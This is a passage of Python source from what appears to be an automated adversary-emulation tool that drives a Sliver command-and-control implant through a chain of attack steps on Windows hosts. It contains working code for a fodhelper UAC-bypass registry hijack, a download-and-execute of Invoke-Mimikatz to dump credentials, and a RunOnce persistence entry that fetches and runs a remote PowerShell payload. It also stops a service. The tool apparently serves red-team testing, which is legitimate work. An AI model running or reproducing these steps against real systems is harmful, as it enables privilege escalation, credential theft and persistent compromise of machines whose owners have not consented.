        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2_var_in_plan"]))
        user_params["EXE_PATH"] = pddl_parameters["string2_var_in_plan"]
    else:
        user_params["EXE_PATH"] = _get_param_input("9_art-t1548_002-fodhelper-uac-bypass-ps", "EXE_PATH", "string2_var_in_plan", 'C:\\Windows\\System32\\cmd.exe', True)
        pddl_parameters["string2_var_in_plan"] = user_params["EXE_PATH"]
    _ps_script = rf"""New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{user_params['EXE_PATH']}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

"""
    console.print(f"[bold cyan]\n[Powershell Executor] PowerShell script to run via Sliver:[/]")
    console.print(f"  [white]{_ps_script}[/]")
    confirm_action("Run this script?")
    console.print(f"[bold cyan][Powershell Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor2_var_in_plan"]["RealSessionID"] if "executor2_var_in_plan" in executor_dict else user_params.get("SessionID", "")
        await sliver_executor.powershell(_session_id, _ps_script)
    except PowerShellNonTerminatingWarning as w:
        _step_uncertain(w)
    except Exception as e:
        _step_failed(e)
    _step_finished(9)
    _step_started(10, "Execute a Sliver Implant Payload")

    console.print(f"[bold cyan]\n📌[Session Check] Step 10[/]")
    console.print(f"[bold cyan]📌[Name] Execute a Sliver Implant Payload[/]")
    # Sliver mirror of the meterpreter observation gate. Poll for a
    # sliver session that hasn't been observed on any earlier step;
    # the chain-level `_seen_sliver_sessions` set makes this robust
    # even when the payload calls back BEFORE the operator finishes
    # the human step (a common case with fast implants).
    if 'sliver_executor' not in dir():
        from attack_executor.post_exploit.Sliver import SliverExecutor
        sliver_executor = SliverExecutor(config=config)
    while True:
        console.print(
            f"[bold cyan][Session Check] Polling for new sliver session (30s)…[/]"
        )
        _deadline = time.time() + 30
        _all_sessions = {}
        _fresh_ids = set()
        while time.time() < _deadline:
            _all_sessions = await sliver_executor.get_sessions()
            _now_ids = set(str(_sid) for _sid in _all_sessions.keys())
            _fresh_ids = _now_ids - _seen_sliver_sessions
            if _fresh_ids:
                break
            await asyncio.sleep(1)
        if _fresh_ids:
            # Same explicit-id UX as the meterpreter gate: type the id
            # of the specific session to accept. Robust to the multi-
            # callback race and future-friendly for the eventual
            # session→executor binding TODO.
            _prev = sorted(_seen_sliver_sessions)
            _new = sorted(_fresh_ids)
            console.print(f"[green]  Previously known sessions:[/] {_prev if _prev else '(none)'}")
            console.print(f"[bold green]  Newly detected session(s):[/]")
            for _sid in _new:
                _s = _all_sessions.get(_sid)
                if _s is not None:
                    console.print(
                        f"    [{_sid}] {_s.Name}@{_s.Hostname} — {_s.Username} ({_s.OS})"
                    )
                else:
                    console.print(f"    [{_sid}] (details unavailable)")
            _default_pick = _new[0]
            while True:
                _picked = (console.input(
                    f"[bold]➤ Session id to accept (default: {_default_pick}, or 'n' to abort chain): [/]"
                ) or _default_pick).strip()
                if _picked.lower() == "n":
                    console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
                    _print_chain_summary(aborted=True)
                    sys.exit(0)
                if _picked in _fresh_ids:
                    break
                console.print(
                    f"[yellow]  '{_picked}' is not one of the newly detected session ids "
                    f"({sorted(_fresh_ids)}). Try again.[/]"
                )
            # Only mark the accepted session as seen; unpicked new
            # sessions stay "fresh" for the next session-check step.
            _seen_sliver_sessions.add(_picked)
            break
        console.print(f"[bold yellow]⚠ No new sliver session after 30s.[/]")
        _choice = (console.input(
            "[bold]➤ Retry polling? \\[r=retry / n=stop and print summary] (r): [/]"
        ) or "r").strip().lower()
        if _choice.startswith("n"):
            console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
            _print_chain_summary(aborted=True)
            sys.exit(0)
    _step_finished(10)
    _step_started(11, "Execute PowerShell Command")

    console.print(f"[bold cyan]\n📌[Sliver Session Derive] Step 11[/]")
    console.print(f"[bold cyan]📌[Name] Execute PowerShell Command[/]")
    # This step establishes a `DerivedExecutorID` — a synthetic
    # Command Prompt / PowerShell / Bash / Sh executor rooted in an
    # existing Sliver session. Sliver's cmd()/powershell()/shell() are
    # one-shot at the RPC level, so there's nothing to "invoke" here;
    # aurora treats derivation as pure PDDL bookkeeping that lets
    # downstream Command Prompt Executor / Powershell Executor actions
    # satisfy their session-flavour preconditions. All the work is in
    # the generic_params loop below (session_select picks/reuses the
    # parent sliver session, derived_executor wires up executor_dict).
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor_parent[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")
    if "executor3_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor3_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor3_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor_parent"] = executor_dict["executor3_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor3_var_in_plan"] = executor_dict["executor3_var_in_plan"]["RealSessionID"]
    executor_dict["executor0_var_in_plan"] = {
        "type": executor_dict["executor3_var_in_plan"]["type"] if "executor3_var_in_plan" in executor_dict else "Sliver Executor",
        "isDerivedExecutor": True,
        "RealSessionID": executor_dict["executor3_var_in_plan"]["RealSessionID"] if "executor3_var_in_plan" in executor_dict else None,
        "parentExecutor": "executor3_var_in_plan"
    }
    # Also expose the derived session id via `pddl_parameters` so
    # downstream steps that look up the executor slot the standard
    # way (Command Prompt Executor, PowerShell Executor, …) find it
    # without an interactive prompt. executor_dict alone isn't
    # enough — the shell/powershell templates check pddl_parameters.
    pddl_parameters["executor0_var_in_plan"] = executor_dict["executor0_var_in_plan"]["RealSessionID"]
    console.print(
        f"[bold green]  ↳ Derived executor_derived executor from Sliver session "
        f"{executor_dict['executor0_var_in_plan']['RealSessionID']}[/]"
    )
    _step_finished(11)
    _step_started(12, "Powershell Mimikatz")

    console.print(f"[bold cyan]\n📌[Powershell Executor] Step 12[/]")
    console.print(f"[bold cyan]\n📌[Name] Powershell Mimikatz[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Powershell session ID used to invoke the command.")
    if "executor0_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor0_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor0_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor"] = executor_dict["executor0_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor0_var_in_plan"] = executor_dict["executor0_var_in_plan"]["RealSessionID"]
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_script[/]")
    console.print(f"  Description: URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror).")
    user_params["remote_script"] = _get_param_input("12_art-t1003_001-mimikatz-powershell", "remote_script", "", 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1', True)
    _ps_script = rf"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('{user_params['remote_script']}'); Invoke-Mimikatz -DumpCreds

"""
    console.print(f"[bold cyan]\n[Powershell Executor] PowerShell script to run via Sliver:[/]")
    console.print(f"  [white]{_ps_script}[/]")
    confirm_action("Run this script?")
    console.print(f"[bold cyan][Powershell Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor0_var_in_plan"]["RealSessionID"] if "executor0_var_in_plan" in executor_dict else user_params.get("SessionID", "")
        await sliver_executor.powershell(_session_id, _ps_script)
    except PowerShellNonTerminatingWarning as w:
        _step_uncertain(w)
    except Exception as e:
        _step_failed(e)
    _step_finished(12)
    _step_started(13, "PowerShell Registry RunOnce")

    console.print(f"[bold cyan]\n📌[Powershell Executor] Step 13[/]")
    console.print(f"[bold cyan]\n📌[Name] PowerShell Registry RunOnce[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Powershell session ID used to invoke Set-ItemProperty.")
    if "executor0_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor0_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor0_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor"] = executor_dict["executor0_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor0_var_in_plan"] = executor_dict["executor0_var_in_plan"]["RealSessionID"]
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: reg_key_path[/]")
    console.print(f"  Description: Registry path for the RunOnce entry.")
    user_params["reg_key_path"] = _get_param_input("13_art-t1547_001-powershell-runonce", "reg_key_path", "", 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: command_to_execute[/]")
    console.print(f"  Description: Command line invoked at next system boot.")
    if "string3_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string3_var_in_plan"]))
        user_params["command_to_execute"] = pddl_parameters["string3_var_in_plan"]
    else:
        user_params["command_to_execute"] = _get_param_input("13_art-t1547_001-powershell-runonce", "command_to_execute", "string3_var_in_plan", "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')", True)
        pddl_parameters["string3_var_in_plan"] = user_params["command_to_execute"]
    _ps_script = rf"""Set-ItemProperty "{user_params['reg_key_path']}" "NextRun" '{user_params['command_to_execute']}'

"""
    console.print(f"[bold cyan]\n[Powershell Executor] PowerShell script to run via Sliver:[/]")
    console.print(f"  [white]{_ps_script}[/]")
    confirm_action("Run this script?")
    console.print(f"[bold cyan][Powershell Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor0_var_in_plan"]["RealSessionID"] if "executor0_var_in_plan" in executor_dict else user_params.get("SessionID", "")
        await sliver_executor.powershell(_session_id, _ps_script)
    except PowerShellNonTerminatingWarning as w:
        _step_uncertain(w)
    except Exception as e:
        _step_failed(e)
    _step_finished(13)
    _step_started(14, "Execute Command (cmd.exe)")

    console.print(f"[bold cyan]\n📌[Sliver Session Derive] Step 14[/]")
    console.print(f"[bold cyan]📌[Name] Execute Command (cmd.exe)[/]")
    # This step establishes a `DerivedExecutorID` — a synthetic
    # Command Prompt / PowerShell / Bash / Sh executor rooted in an
    # existing Sliver session. Sliver's cmd()/powershell()/shell() are
    # one-shot at the RPC level, so there's nothing to "invoke" here;
    # aurora treats derivation as pure PDDL bookkeeping that lets
    # downstream Command Prompt Executor / Powershell Executor actions
    # satisfy their session-flavour preconditions. All the work is in
    # the generic_params loop below (session_select picks/reuses the
    # parent sliver session, derived_executor wires up executor_dict).
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor_parent[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")
    if "executor3_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor3_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor3_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor_parent"] = executor_dict["executor3_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor3_var_in_plan"] = executor_dict["executor3_var_in_plan"]["RealSessionID"]
    executor_dict["executor1_var_in_plan"] = {
        "type": executor_dict["executor3_var_in_plan"]["type"] if "executor3_var_in_plan" in executor_dict else "Sliver Executor",
        "isDerivedExecutor": True,
        "RealSessionID": executor_dict["executor3_var_in_plan"]["RealSessionID"] if "executor3_var_in_plan" in executor_dict else None,
        "parentExecutor": "executor3_var_in_plan"
    }
    # Also expose the derived session id via `pddl_parameters` so
    # downstream steps that look up the executor slot the standard
    # way (Command Prompt Executor, PowerShell Executor, …) find it
    # without an interactive prompt. executor_dict alone isn't
    # enough — the shell/powershell templates check pddl_parameters.
    pddl_parameters["executor1_var_in_plan"] = executor_dict["executor1_var_in_plan"]["RealSessionID"]
    console.print(
        f"[bold green]  ↳ Derived executor_derived executor from Sliver session "
        f"{executor_dict['executor1_var_in_plan']['RealSessionID']}[/]"
    )
    _step_finished(14)
    _step_started(15, "Windows - Stop service using net.exe")

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 15[/]")
    console.print(f"[bold cyan]\n📌[Name] Windows - Stop service using net.exe[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Command Prompt session ID used to invoke net.")
    if "executor1_var_in_plan" in executor_dict:
        console.print(f"  [green]✓ Using stored value:[/] " + str(executor_dict["executor1_var_in_plan"]["RealSessionID"]))
    else:
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)
        selected = await sliver_executor.select_sessions()
        executor_dict["executor1_var_in_plan"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected,
            "parentExecutor": None
        }
    user_params["executor"] = executor_dict["executor1_var_in_plan"]["RealSessionID"]
    pddl_parameters["executor1_var_in_plan"] = executor_dict["executor1_var_in_plan"]["RealSessionID"]
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: service_name[/]")
    console.print(f"  Description: Name of the Windows service to stop.")
    user_params["service_name"] = _get_param_input("15_art-t1489-net-stop-service", "service_name", "", 'spooler', True)
    _shell_cmd = rf"""net.exe stop {user_params['service_name']}
"""
    console.print(f"[bold cyan]\n[Command Prompt Executor] Command to run via Sliver:[/]")
    console.print(f"  [white]{_shell_cmd}[/]")
    confirm_action("Run this command?")
    console.print(f"[bold cyan][Command Prompt Executor] Running…[/]")
    try:
        _session_id = executor_dict["executor1_var_in_plan"]["RealSessionID"] if "executor1_var_in_plan" in executor_dict else user_params.get("SessionID", "")
        await sliver_executor.cmd(_session_id, _shell_cmd)
    except Exception as e:
        _step_failed(e)
    _step_finished(15)

    _print_chain_summary()
    # CI-style exit code: chain that had any failed step returns 1 so
    # batch runners / cron / driver scripts detect it without parsing
    # the summary. Successful chain returns 0.
    if any(r["status"] == "failed" for r in _STEP_RECORDS):
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
